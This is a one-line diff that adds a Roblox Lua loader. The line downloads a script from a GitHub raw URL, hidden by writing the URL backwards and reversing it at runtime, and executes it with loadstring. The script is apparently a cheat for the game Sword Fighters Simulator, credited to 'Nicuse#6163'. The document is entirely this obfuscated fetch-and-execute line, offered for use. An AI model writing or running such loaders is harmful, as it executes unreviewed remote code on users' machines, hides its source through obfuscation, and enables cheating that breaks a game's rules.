@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(string.reverse("aul.rotalumiSsrethgiFdrowS/niam/stpircSxolboR/esuciN/moc.tnetnocresubuhtig.war//:sptth")))("Made by Nicuse#6163")
